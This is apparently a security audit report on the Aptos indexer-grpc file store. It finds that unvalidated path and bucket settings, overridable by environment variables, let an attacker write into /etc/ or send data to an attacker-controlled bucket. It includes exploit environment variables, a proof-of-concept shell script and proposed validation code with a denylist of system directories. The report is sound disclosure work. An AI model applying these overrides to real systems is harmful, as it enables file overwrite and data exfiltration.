# Audit Report

## Title
Arbitrary Filesystem Write and Cloud Storage Access via Unvalidated File Store Configuration Paths

## Summary
The indexer-grpc file store service lacks validation for `LocalFileStore` paths and `GcsFileStore` bucket names, allowing an attacker who can control environment variables or configuration files to write transaction data to arbitrary filesystem locations or access sensitive cloud storage buckets. This vulnerability can lead to Remote Code Execution through system file overwriting or data exfiltration through unauthorized cloud bucket access.

## Finding Description

The `IndexerGrpcFileStoreWorkerConfig` accepts file store configuration through YAML files and environment variables without validating that specified paths or bucket names are safe. [1](#0-0) 

The configuration is loaded using Figment, which merges environment variables on top of YAML config: [2](#0-1) 

Environment variables using double underscore (`__`) notation can override any configuration field, including `local_file_store_path` and `gcs_file_store_bucket_name`.

The `LocalFileStoreOperator` constructor accepts any path without validation: [3](#0-2) 

The only validation is checking if the path exists, not whether it's a safe location: [4](#0-3) 

Subsequently, the service writes transaction batch files and metadata directly to the specified path: [5](#0-4) [6](#0-5) 

Similarly, `GcsFileStoreOperator` accepts any bucket name without validation: [7](#0-6) 

**Attack Scenario:**

An attacker who can control environment variables (e.g., through container orchestration compromise, CI/CD pipeline injection, or misconfigured deployment systems) can set:

```bash
SERVER_CONFIG__FILE_STORE_CONFIG__FILE_STORE_TYPE=LocalFileStore
SERVER_CONFIG__FILE_STORE_CONFIG__LOCAL_FILE_STORE_PATH=/etc/
```

This causes the indexer to write transaction data files to `/etc/`, potentially overwriting critical system configuration files like `/etc/metadata.json`, `/etc/cron.d/`, or other system files that could lead to code execution.

For GCS exploitation:
```bash
SERVER_CONFIG__FILE_STORE_CONFIG__FILE_STORE_TYPE=GcsFileStore
SERVER_CONFIG__FILE_STORE_CONFIG__GCS_FILE_STORE_BUCKET_NAME=attacker-controlled-bucket
```

This allows data exfiltration by writing blockchain transaction data to an attacker-controlled bucket if the service account has cross-project permissions.

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under the Aptos bug bounty program category "Remote Code Execution on validator node" for the following reasons:

1. **Arbitrary File Write**: An attacker can write to any filesystem location the indexer process has permissions for, including `/etc/`, `/root/`, `/var/`, and other system directories.

2. **Remote Code Execution Path**: By overwriting system files such as:
   - `/etc/cron.d/` entries - scheduled code execution
   - `/etc/ld.so.preload` - library injection
   - Service configuration files leading to command execution on service restart

3. **Data Exfiltration**: Through GCS bucket name control, an attacker can redirect transaction data to attacker-controlled cloud storage, potentially exposing sensitive blockchain data.

4. **Infrastructure Compromise**: If the indexer service runs on the same infrastructure as validator nodes (common in production deployments), this provides a pivot point for attacking consensus-critical components.

5. **Violation of Security Invariants**: This breaks the "Access Control" and "Resource Limits" critical invariants by allowing unrestricted filesystem and cloud resource access.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is highly exploitable in real-world scenarios because:

1. **Environment Variable Control**: Container orchestration systems (Kubernetes, Docker Compose, ECS) commonly allow environment variable injection through:
   - ConfigMaps/Secrets in Kubernetes
   - Docker environment files
   - CI/CD pipeline variables
   - Service mesh configurations

2. **Common Attack Vectors**:
   - Compromised CI/CD pipelines (supply chain attacks)
   - Misconfigured RBAC in Kubernetes allowing config modification
   - Container escape leading to host environment manipulation
   - Insider threats with deployment access

3. **No Defense in Depth**: The code has zero validation, making it trivially exploitable once environment control is achieved.

4. **Deployment Reality**: Indexer services often run with elevated permissions to access blockchain data, increasing the impact surface.

## Recommendation

Implement comprehensive validation for file store paths and bucket names:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-utils/src/config.rs

use std::path::{Path, PathBuf};

impl LocalFileStore {
    fn validate(&self) -> anyhow::Result<()> {
        let path = &self.local_file_store_path;
        
        // Ensure path is absolute to prevent confusion
        if !path.is_absolute() {
            anyhow::bail!("File store path must be absolute: {:?}", path);
        }
        
        // Whitelist of allowed base directories
        let allowed_prefixes = vec![
            PathBuf::from("/var/lib/aptos/indexer"),
            PathBuf::from("/opt/aptos/data"),
            // Add other explicitly allowed paths
        ];
        
        // Check if path starts with an allowed prefix
        let is_allowed = allowed_prefixes.iter().any(|prefix| {
            path.starts_with(prefix)
        });
        
        if !is_allowed {
            anyhow::bail!(
                "File store path {:?} is not within allowed directories. Allowed prefixes: {:?}",
                path,
                allowed_prefixes
            );
        }
        
        // Prevent writing to system directories
        let forbidden_prefixes = vec![
            PathBuf::from("/etc"),
            PathBuf::from("/root"),
            PathBuf::from("/sys"),
            PathBuf::from("/proc"),
            PathBuf::from("/boot"),
            PathBuf::from("/usr/bin"),
            PathBuf::from("/usr/sbin"),
        ];
        
        for forbidden in &forbidden_prefixes {
            if path.starts_with(forbidden) {
                anyhow::bail!(
                    "File store path {:?} cannot be within forbidden directory {:?}",
                    path,
                    forbidden
                );
            }
        }
        
        Ok(())
    }
}

impl GcsFileStore {
    fn validate(&self) -> anyhow::Result<()> {
        let bucket_name = &self.gcs_file_store_bucket_name;
        
        // Validate bucket name format (GCS bucket naming rules)
        if bucket_name.is_empty() || bucket_name.len() > 63 {
            anyhow::bail!("Invalid GCS bucket name length");
        }
        
        // Whitelist of allowed bucket name patterns
        let allowed_patterns = vec![
            "aptos-indexer-",
            "aptos-mainnet-indexer-",
            "aptos-testnet-indexer-",
            // Add organization-specific patterns
        ];
        
        let is_allowed = allowed_patterns.iter().any(|pattern| {
            bucket_name.starts_with(pattern)
        });
        
        if !is_allowed {
            anyhow::bail!(
                "GCS bucket name '{}' does not match allowed patterns: {:?}",
                bucket_name,
                allowed_patterns
            );
        }
        
        Ok(())
    }
}
```

Update the `RunnableConfig` implementation to validate on startup:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-file-store/src/lib.rs

#[async_trait::async_trait]
impl RunnableConfig for IndexerGrpcFileStoreWorkerConfig {
    fn validate(&self) -> Result<()> {
        // Validate file store config based on type
        match &self.file_store_config {
            IndexerGrpcFileStoreConfig::LocalFileStore(config) => {
                config.validate()
                    .context("LocalFileStore configuration validation failed")?;
            },
            IndexerGrpcFileStoreConfig::GcsFileStore(config) => {
                config.validate()
                    .context("GcsFileStore configuration validation failed")?;
            },
        }
        Ok(())
    }
    
    // ... rest of implementation
}
```

## Proof of Concept

**Setup:**
1. Build the indexer-grpc file store service
2. Create a test configuration file

**Exploitation via Environment Variables:**

```bash
# Create minimal config file
cat > /tmp/test-config.yaml << EOF
health_check_port: 8080
server_config:
  redis_main_instance_address: "redis://localhost:6379"
  chain_id: 1
  enable_cache_compression: false
  file_store_config:
    file_store_type: LocalFileStore
    local_file_store_path: /tmp/safe-path
    enable_compression: false
EOF

# Run service with malicious environment variable override
# This overrides the safe path with /etc/
export SERVER_CONFIG__FILE_STORE_CONFIG__LOCAL_FILE_STORE_PATH=/etc/

# Start the service
./target/release/aptos-indexer-grpc-file-store -c /tmp/test-config.yaml

# The service will now attempt to write transaction data to /etc/
# If run with sufficient permissions, this will create/overwrite files in /etc/
# Example: /etc/metadata.json will be created/overwritten with blockchain metadata
```

**Verification:**
1. Monitor filesystem writes: `sudo auditctl -w /etc/ -p wa`
2. Check for created files: `ls -la /etc/metadata.json`
3. Observe transaction batch files created in system directories

**Expected Result:**
Without validation, the service successfully writes to `/etc/`, demonstrating arbitrary filesystem write capability. With the recommended fix, the service should fail validation and refuse to start.

## Notes

This vulnerability demonstrates a critical failure in defense-in-depth principles. While configuration files should be protected through operational security measures, the code itself must validate security-critical parameters to prevent catastrophic failures when those protections are bypassed. The Figment library's environment variable merging feature, while useful for containerized deployments, significantly expands the attack surface by allowing configuration overrides through environment variables that may be easier to compromise than configuration files.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/config.rs (L20-24)
```rust
pub struct LocalFileStore {
    pub local_file_store_path: PathBuf,
    #[serde(default = "default_enable_compression")]
    pub enable_compression: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L130-136)
```rust
pub fn load<T: for<'de> Deserialize<'de>>(path: &PathBuf) -> Result<T> {
    Figment::new()
        .merge(Yaml::file(path))
        .merge(Env::raw().split("__"))
        .extract()
        .map_err(anyhow::Error::msg)
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/local.rs (L24-35)
```rust
    pub fn new(path: PathBuf, enable_compression: bool) -> Self {
        let storage_format = if enable_compression {
            StorageFormat::Lz4CompressedProto
        } else {
            StorageFormat::JsonBase64UncompressedProto
        };
        Self {
            path,
            latest_metadata_update_timestamp: None,
            storage_format,
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/local.rs (L40-48)
```rust
    async fn verify_storage_bucket_existence(&self) {
        tracing::info!(
            bucket_name = self.path.to_str().unwrap(),
            "Before file store operator starts, verify the bucket exists."
        );
        if !self.path.exists() {
            panic!("File store path does not exist.");
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/local.rs (L133-145)
```rust
        let metadata_path = self.path.join(METADATA_FILE_NAME);
        info!(
            "Updating metadata file {} @ version {}",
            metadata_path.display(),
            version
        );
        match tokio::fs::write(metadata_path, serde_json::to_vec(&metadata).unwrap()).await {
            Ok(_) => {
                self.latest_metadata_update_timestamp = Some(std::time::Instant::now());
                Ok(())
            },
            Err(err) => Err(anyhow::Error::from(err)),
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/local.rs (L173-189)
```rust
            let txns_path = self.path.join(file_entry_key.as_str());
            let parent_dir = txns_path.parent().unwrap();
            if !parent_dir.exists() {
                tracing::debug!("Creating parent dir: {parent_dir:?}.");
                tokio::fs::create_dir_all(parent_dir).await?;
            }

            tracing::debug!(
                "Uploading transactions to {:?}",
                txns_path.to_str().unwrap()
            );
            let task = tokio::spawn(async move {
                match tokio::fs::write(txns_path, file_entry.into_inner()).await {
                    Ok(_) => Ok(()),
                    Err(err) => Err(anyhow::Error::from(err)),
                }
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/gcs.rs (L28-63)
```rust
impl GcsFileStoreOperator {
    pub fn new(
        bucket_name: String,
        bucket_sub_dir: Option<PathBuf>,
        service_account_path: String,
        enable_compression: bool,
    ) -> Self {
        // TODO: Audit that the environment access only happens in single-threaded code.
        unsafe {
            env::set_var(SERVICE_ACCOUNT_ENV_VAR, service_account_path);
        }
        let storage_format = if enable_compression {
            StorageFormat::Lz4CompressedProto
        } else {
            StorageFormat::JsonBase64UncompressedProto
        };
        let metadata_file_path = match &bucket_sub_dir {
            Some(sub_dir) => {
                let mut metadata_file_path = sub_dir.clone();
                metadata_file_path.push(METADATA_FILE_NAME);
                metadata_file_path
            },
            None => {
                let mut metadata_file_path = PathBuf::new();
                metadata_file_path.push(METADATA_FILE_NAME);
                metadata_file_path
            },
        };
        Self {
            bucket_name,
            bucket_sub_dir,
            file_store_metadata_last_updated: std::time::Instant::now(),
            storage_format,
            metadata_file_path,
        }
    }
```
